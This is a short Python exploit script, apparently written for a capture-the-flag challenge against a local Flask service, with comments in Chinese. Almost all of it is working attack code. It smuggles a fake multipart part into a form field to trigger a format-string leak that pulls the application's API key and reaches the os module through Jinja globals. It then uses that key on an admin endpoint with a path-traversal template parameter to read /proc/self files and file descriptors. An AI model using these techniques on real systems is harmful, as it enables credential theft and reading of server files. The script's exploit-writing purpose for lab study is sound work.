import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=5.0)
    return r.text, r.status_code

# 获取 API_KEY
api_key = format_string_leak("{0.view_functions[action].__globals__[API_KEY]}")
print(f"[+] API_KEY: {api_key}")

# 尝试获取 Python 进程的 PID
pid = format_string_leak("{0.jinja_env.globals[lipsum].__globals__[os].getpid}")
print(f"[+] os.getpid: {pid}")

# 通过 /proc/self 获取信息
files_to_check = [
    '../../../proc/self/comm',
    '../../../proc/self/status',
    '../../../proc/self/fd/0',
    '../../../proc/self/fd/3',
    '../../../proc/self/fd/4',
    '../../../proc/self/fd/5',
]

for f in files_to_check:
    content, status = read_file_via_admin(api_key, f)
    print(f"\n[{f}] Status: {status}")
    if status == 200:
        print(content[:500])
